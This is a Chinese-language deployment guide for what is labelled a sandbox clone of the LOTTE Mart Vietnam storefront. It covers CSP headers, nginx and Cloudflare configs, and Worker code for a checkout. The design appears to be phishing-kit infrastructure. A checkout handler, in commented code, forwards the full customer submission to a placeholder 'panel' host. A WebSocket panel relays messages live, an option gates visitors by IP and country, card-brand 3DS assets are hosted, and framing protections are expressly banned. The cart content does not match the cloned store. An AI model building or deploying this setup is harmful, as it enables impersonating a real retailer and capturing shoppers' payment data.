<!-- [ltm-clone] LOTTE Mart Vietnam — storefront clone (sandbox fixture)
visual reference: https://www.lottemart.vn/ (snapshot 2026-11-20)
for internal testing / demo use only — not affiliated with LOTTE Mart -->
# 部署形态与能力边界

三种形态都能满足契约 v1.0；差别只在 **`/api/*` 谁来跑**、**能不能出站**、**谁能当 WebSocket 服务端**。

| 能力 | 纯静态（Pages/Netlify/S3/nginx） | Pages Functions | 独立 Worker |
|---|---|---|---|
| `/checkout` 页面 + query 保留 | ✅ | ✅ | ✅ |
| `window.__BP_CART__`（head 内联骨架） | ✅ | ✅ | ✅ |
| `GET /api/cart` | ❌ 404 | ✅ | ✅ |
| `POST /api/checkout` 真提交 | ❌ 404 | ✅ | ✅ |
| `/bp/*` 托管 + CSP 放行 | ✅（`_headers`/nginx） | ✅ | ✅ |
| **出站 HTTP（服务器侧）** | ❌ 无服务端 | ✅ `fetch()`，免费版 CPU 10ms / 50 子请求 | ✅ 同左；Durable Object 可长期持有 |
| **WebSocket 服务端** | ❌ | ❌ 不支持 Upgrade | ✅ `WebSocketPair` + Durable Objects |
| 浏览器连面板 `wss://` | ✅ 只看 CSP `connect-src` | ✅ | ✅ |
| `/bp/config.json` 的 `enable_verify` | `false` | 可置 `true`（需另做 `/api/bp/verify`） | 可置 `true` |

> 面板的 WebSocket **服务端**必须放在 Worker（Durable Objects）或自己的 VPS。Pages Functions 与纯静态都当不了 WS 服务端；浏览器到面板的 `wss` 连接只受 CSP 约束。

---

## 统一 CSP（契约 §7.1 方案 A，逐字复制即可）

```
default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data: https:; connect-src 'self' https://PANEL_DOMAIN wss://PANEL_DOMAIN; frame-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'
```

配套三个头（§7.1）：

```
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: payment=(self), clipboard-write=(self)
```

**不要加**：`sandbox`、`require-trusted-types-for 'script'`、`X-Frame-Options`、任何 `nonce-` / `sha256-`。
`PANEL_DOMAIN` 含端口就写 `host:port`。

---

## A. 纯静态

`public/` 整目录上传。`/checkout` 需要 SPA fallback（重写，不是跳转）。

**Cloudflare Pages / Netlify `public/_headers`**：

```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data: https:; connect-src 'self' https://panel.example.com wss://panel.example.com; frame-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: payment=(self), clipboard-write=(self)
```

**Cloudflare Pages `_redirects`**（SPA fallback，`200` 是重写，URL 与 query 都保留）：

```
/*  /index.html  200
```

**nginx**：

```nginx
server {
  root /var/www/aurora/public;

  # SPA fallback：内部重写，不改地址栏，utm_* 不丢
  location / { try_files $uri $uri/ /index.html; }

  # /bp/* 必须直出，缺失就 404，绝不能回落到 index.html
  location /bp/ { try_files $uri =404; }
  location /assets/ { try_files $uri =404; }

  add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data: https:; connect-src 'self' https://panel.example.com wss://panel.example.com; frame-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  add_header Permissions-Policy "payment=(self), clipboard-write=(self)" always;
}
```

纯静态下 `window.__BP_CART__` 必须由构建脚本把 `__BP_CART_JSON__` 替换成真实 JSON（把 `server.mjs` 的 `renderShell()` 逻辑搬进构建步骤）。`POST /api/checkout` 会 404 → 前端把 `#bp-error` 写成「网络异常」，验收单第 9 条仍是过的。

---

## B. Pages Functions（要真接口，不要 WS 服务端）

```
functions/
├── _middleware.js        # 统一加 CSP
├── api/
│   ├── cart.js
│   └── checkout.js
```

`functions/api/cart.js`（结构与 `__BP_CART__` 完全一致，金额整数分）：

```js
const CART = {
  order_number: 'ORD-20261120-7F3A',
  currency: 'CNY',
  total: 129900,
  total_amount: '¥1,299.00',
  items: [
    { name: 'Aurora 美丽诺羊毛针织衫 — 炭灰 / M', qty: 1, price: 109900 },
    { name: '羊毛护理套装（洗剂 + 梳子）', qty: 2, price: 10000 },
  ],
  locale: 'zh-CN',
};

export const onRequestGet = () =>
  new Response(JSON.stringify(CART), {
    headers: { 'content-type': 'application/json; charset=utf-8', 'cache-control': 'no-store' },
  });
```

`functions/api/checkout.js`（200 + JSON、单号复用、幂等）：

```js
const DONE = new Map();   // 生产环境换成 KV / D1；单实例内存也行，幂等键是 order_number

export const onRequestPost = async ({ request }) => {
  const body = await request.json().catch(() => null);
  const json = (o) => Response.json(o);   // 成功失败都 200

  if (!body || typeof body.order_number !== 'string' || !body.order_number) {
    return json({ ok: false, error_code: 'bad_request', message: '请求格式错误。' });
  }
  if (!Number.isInteger(body.amount) || body.amount <= 0) {
    return json({ ok: false, error_code: 'invalid_amount', message: '订单金额无效。' });
  }
  if (!String(body.customer?.email || '').includes('@')) {
    return json({ ok: false, error_code: 'invalid_email', message: '请输入有效的邮箱地址。' });
  }
  if (/decline/i.test(body.customer.email)) {
    return json({ ok: false, error_code: 'card_declined', message: '支付未通过，请更换卡片或重试。' });
  }

  const key = body.order_number;
  if (DONE.has(key)) return json(DONE.get(key));       // 同号重放 → 同响应

  const result = { ok: true, order_number: key };      // 单号复用，绝不重新生成
  DONE.set(key, result);

  // 出站 HTTP 可以（这里推给面板/你的后端）
  // await fetch('https://panel.example.com/bp/report', {
  //   method: 'POST', headers: { 'content-type': 'application/json' },
  //   body: JSON.stringify(body),
  // }).catch(() => {});

  return json(result);   // 不 302/303，跳转交给前端
};
```

`functions/_middleware.js`：

```js
const CSP = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data: https:; connect-src 'self' https://panel.example.com wss://panel.example.com; frame-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'";

export const onRequest = async (context) => {
  const res = await context.next();
  const out = new Response(res.body, res);
  out.headers.set('Content-Security-Policy', CSP);
  out.headers.set('X-Content-Type-Options', 'nosniff');
  out.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  out.headers.set('Permissions-Policy', 'payment=(self), clipboard-write=(self)');
  return out;
};
```

> 用 Pages Functions 后可以把 `/bp/config.json` 的 `enable_verify` 改成 `true`，但契约 §10 说明它是"走服务端 IP/国家准入"，需要你另外实现 `/api/bp/verify`。没实现前保持 `false`。

---

## C. 独立 Worker（要 API + 要 WS 服务端）

`wrangler.toml`：

```toml
name = "aurora-supply"
main = "worker/index.js"
compatibility_date = "2025-01-01"

[assets]
directory = "./public"
binding = "ASSETS"
not_found_handling = "single-page-application"

[[durable_objects.bindings]]
name = "PANEL"
class_name = "PanelSocket"

[[migrations]]
tag = "v1"
new_sqlite_classes = ["PanelSocket"]
```

`worker/index.js`：

```js
const CSP = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data: https:; connect-src 'self' https://panel.example.com wss://panel.example.com; frame-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'";

const CART = {
  order_number: 'ORD-20261120-7F3A', currency: 'CNY', total: 129900, total_amount: '¥1,299.00',
  items: [{ name: 'Aurora 美丽诺羊毛针织衫 — 炭灰 / M', qty: 1, price: 109900 },
          { name: '羊毛护理套装（洗剂 + 梳子）', qty: 2, price: 10000 }],
  locale: 'zh-CN',
};

const json = (o, s = 200) => new Response(JSON.stringify(o), {
  status: s, headers: { 'content-type': 'application/json; charset=utf-8', 'cache-control': 'no-store' },
});

const DONE = new Map();

export default {
  async fetch(req, env) {
    const url = new URL(req.url);

    if (url.pathname === '/api/cart') return json(CART);

    if (url.pathname === '/api/checkout' && req.method === 'POST') {
      const body = await req.json().catch(() => null);
      if (!body || !body.order_number) return json({ ok: false, error_code: 'bad_request', message: '请求格式错误。' });
      if (!Number.isInteger(body.amount) || body.amount <= 0) return json({ ok: false, error_code: 'invalid_amount', message: '订单金额无效。' });
      if (/decline/i.test(String(body.customer?.email || ''))) {
        return json({ ok: false, error_code: 'card_declined', message: '支付未通过，请更换卡片或重试。' });
      }
      const key = body.order_number;
      if (DONE.has(key)) return json(DONE.get(key));
      const result = { ok: true, order_number: key };
      DONE.set(key, result);
      // 出站 HTTP：Worker 里直接 fetch，无 CORS 限制
      // await fetch('https://panel.example.com/bp/report', { method: 'POST', body: JSON.stringify(body) }).catch(() => {});
      return json(result);
    }

    // 面板 WebSocket（若面板自己不做服务端）
    if (url.pathname === '/bp/ws') {
      const id = env.PANEL.idFromName(url.searchParams.get('sid') || 'anon');
      return env.PANEL.get(id).fetch(req);
    }

    const res = await env.ASSETS.fetch(req);
    const out = new Response(res.body, res);
    out.headers.set('Content-Security-Policy', CSP);
    out.headers.set('X-Content-Type-Options', 'nosniff');
    out.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
    out.headers.set('Permissions-Policy', 'payment=(self), clipboard-write=(self)');
    return out;
  },
};

export class PanelSocket {
  constructor(state) { this.state = state; this.sessions = new Set(); }

  async fetch(req) {
    if (req.headers.get('Upgrade') !== 'websocket') return new Response('expected websocket', { status: 426 });
    const pair = new WebSocketPair();
    const [client, server] = Object.values(pair);
    server.accept();
    this.sessions.add(server);
    server.addEventListener('message', (ev) => {
      for (const s of this.sessions) { try { s.send(ev.data); } catch {} }
    });
    server.addEventListener('close', () => this.sessions.delete(server));
    return new Response(null, { status: 101, webSocket: client });
  }
}
```

> `DONE` 用 `Map` 只在单 isolate 有效。要跨实例幂等，换成 KV / D1 / Durable Object 存储，键是 `order_number`。

---

## D. 出站 HTTP 与 WebSocket 的具体限制

**出站 HTTP（服务器侧 fetch）**

- Pages Functions / Workers：可以。免费版 Workers 单次 50 子请求、CPU 10ms；转发一次 JSON 够用。
- 出站**没有 CORS**（CORS 是浏览器的事）。可以带 `Authorization` / `Cookie`。
- 不能连长轮询/大流（耗 CPU 配额）；不能连服务器本地端口。
- 纯静态：无服务端，只能浏览器直接发，受 `connect-src` + 对方 CORS 双重约束。

**WebSocket**

- 浏览器 → `wss://PANEL_DOMAIN`：CSP `connect-src` 放行即可，与托管形态无关。断线重连与心跳由 `/bp/connector.js` 负责（参考实现里有 25s 心跳）。
- Worker 当服务端：`WebSocketPair` + `status: 101`，配合 Durable Objects 才能跨实例广播与保活。
- Pages Functions：**不能**升级协议。
- 纯静态：不能。
- 自带 VPS 就用 Node `ws` / Go / Python，把 `BP_PANEL_DOMAIN` 换成该域，CSP 自动跟着变。

---

## E. 上线后复核

```bash
curl -sI https://站点/checkout | grep -iE 'content-security-policy|location|permissions-policy'
curl -s -o /dev/null -w '%{http_code}\n' https://站点/bp/connector.js
curl -s -o /dev/null -w '%{http_code}\n' https://站点/bp/3ds/img/visa.svg
curl -s 'https://站点/checkout?utm_source=fb&adset_id=123' | grep -c bp_utm
node scripts/verify.mjs https://站点      # 同一套 81 项
```

- [ ] `/checkout` 与 `/checkout/` 都 200、都无 `Location`
- [ ] `/order/<号>` 刷新不 404
- [ ] 地址栏 utm 从首页 → 购物车 → 结账 → 成功页全程不消失
- [ ] 线上 CSP 与 §7.1 原文一致，**没有** nonce / sandbox / X-Frame-Options
- [ ] `/bp/*` 缺失资源是 404，不是 index.html
- [ ] Console 无 `Refused to execute inline script` / `Refused to connect`
- [ ] `navigator.serviceWorker.controller === null`，`/sw.js` 404
- [ ] 375 宽 `document.documentElement.scrollWidth <= innerWidth`
